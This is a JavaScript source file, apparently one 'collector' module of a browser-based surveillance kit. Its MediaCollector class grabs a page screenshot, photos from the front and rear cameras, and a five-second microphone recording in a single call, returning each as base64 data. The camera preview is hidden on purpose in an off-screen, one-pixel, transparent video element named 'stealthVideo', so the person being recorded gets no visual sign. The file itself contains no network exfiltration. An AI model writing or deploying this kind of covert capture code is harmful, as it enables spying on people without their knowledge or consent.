// language: JavaScript, file: collectors/media.js
// *screenshot works without gesture; camera/mic return status:'denied' if blocked*

export class MediaCollector {
    constructor() { this.name = 'media'; }

    async collect() {
        const r = { screenshot: null, camera: null, backCamera: null, microphone: null, timestamp: Date.now() };
        r.screenshot = await this.captureScreenshot();
        r.camera = await this.captureCamera('user');
        r.backCamera = await this.captureCamera('environment');
        r.microphone = await this.recordAudio();
        return r;
    }

    async captureScreenshot() {
        try {
            if (typeof html2canvas === 'undefined') return { error: 'html2canvas not loaded' };
            const canvas = await html2canvas(document.body, {
                scale: 0.5, useCORS: true, logging: false, allowTaint: true,
                backgroundColor: null, width: window.innerWidth, height: window.innerHeight,
            });
            return {
                type: 'fullpage',
                resolution: `${canvas.width}x${canvas.height}`,
                data: canvas.toDataURL('image/jpeg', 0.7),
                timestamp: Date.now(),
            };
        } catch (error) { return { error: error.message }; }
    }

    async captureCamera(facingMode = 'user') {
        try {
            const constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 } } };
            if (facingMode === 'environment') constraints.video.facingMode = { exact: 'environment' };
            else constraints.video.facingMode = 'user';

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            let video = document.getElementById('stealthVideo');
            if (!video) {
                video = document.createElement('video');
                video.id = 'stealthVideo';
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                video.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
                document.body.appendChild(video);
            }
            video.srcObject = stream;
            try { await video.play(); } catch (e) {}
            await this.delay(800);

            const w = video.videoWidth || 640, h = video.videoHeight || 480;
            const canvas = document.createElement('canvas');
            canvas.width = w; canvas.height = h;
            canvas.getContext('2d').drawImage(video, 0, 0, w, h);
            const photo = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;
            return { type: 'photo', resolution: `${w}x${h}`, camera: facingMode, data: photo, timestamp: Date.now() };
        } catch (error) {
            return { error: error.message, status: 'denied' };
        }
    }

    async recordAudio(duration = 5000) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false, channelCount: 2 },
            });
            const recorder = new MediaRecorder(stream, { mimeType: this.getAudioMimeType() });
            const chunks = [];
            return new Promise((resolve) => {
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        stream.getTracks().forEach(t => t.stop());
                        resolve({
                            type: 'audio', duration: duration / 1000, format: 'webm',
                            size: blob.size, data: reader.result, timestamp: Date.now(),
                        });
                    };
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, duration);
            });
        } catch (error) {
            return { error: error.message, status: 'denied' };
        }
    }

    getAudioMimeType() {
        for (const t of ['audio/webm;codecs=opus','audio/webm','audio/ogg;codecs=opus','audio/mp4']) {
            if (MediaRecorder.isTypeSupported(t)) return t;
        }
        return 'audio/webm';
    }

    delay(ms) { return new Promise(r => setTimeout(r, ms)); }
}